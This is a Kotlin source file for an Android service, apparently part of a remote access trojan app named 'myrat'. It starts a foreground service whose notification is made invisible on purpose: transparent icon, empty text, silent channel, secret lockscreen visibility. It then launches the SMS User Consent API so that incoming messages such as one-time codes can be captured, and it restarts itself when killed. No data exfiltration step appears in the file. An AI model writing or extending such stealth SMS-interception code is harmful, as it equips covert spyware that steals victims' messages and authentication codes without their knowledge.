package com.myrat.app.service

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.IBinder
import com.google.android.gms.auth.api.phone.SmsRetriever
import com.myrat.app.utils.Logger

class SmsConsentService : Service() {
    override fun onCreate() {
        super.onCreate()
        startSilentForeground()
        startSmsConsent()
    }

    private fun startSilentForeground() {
        val channelId = "sms_consent_channel"
        val channel = NotificationChannel(
            channelId,
            "Silent SMS Consent Channel",
            NotificationManager.IMPORTANCE_MIN
        ).apply {
            description = "Used for background SMS consent service"
            setSound(null, null)
            enableLights(false)
            enableVibration(false)
            setShowBadge(false)
            lockscreenVisibility = Notification.VISIBILITY_SECRET
        }

        val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        manager.createNotificationChannel(channel)

        val notification = Notification.Builder(this, channelId)
            .setSmallIcon(android.R.color.transparent)
            .setContentTitle("")
            .setContentText("")
            .setPriority(Notification.PRIORITY_MIN)
            .setVisibility(Notification.VISIBILITY_SECRET)
            .build()

        startForeground(11, notification)
    }

    private fun startSmsConsent() {
        SmsRetriever.getClient(this).startSmsUserConsent(null)
            .addOnSuccessListener { Logger.log("SMS Consent API started from service") }
            .addOnFailureListener { Logger.error("Consent API failed: ${it.message}") }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int) = START_STICKY
    override fun onBind(intent: Intent?): IBinder? = null
}
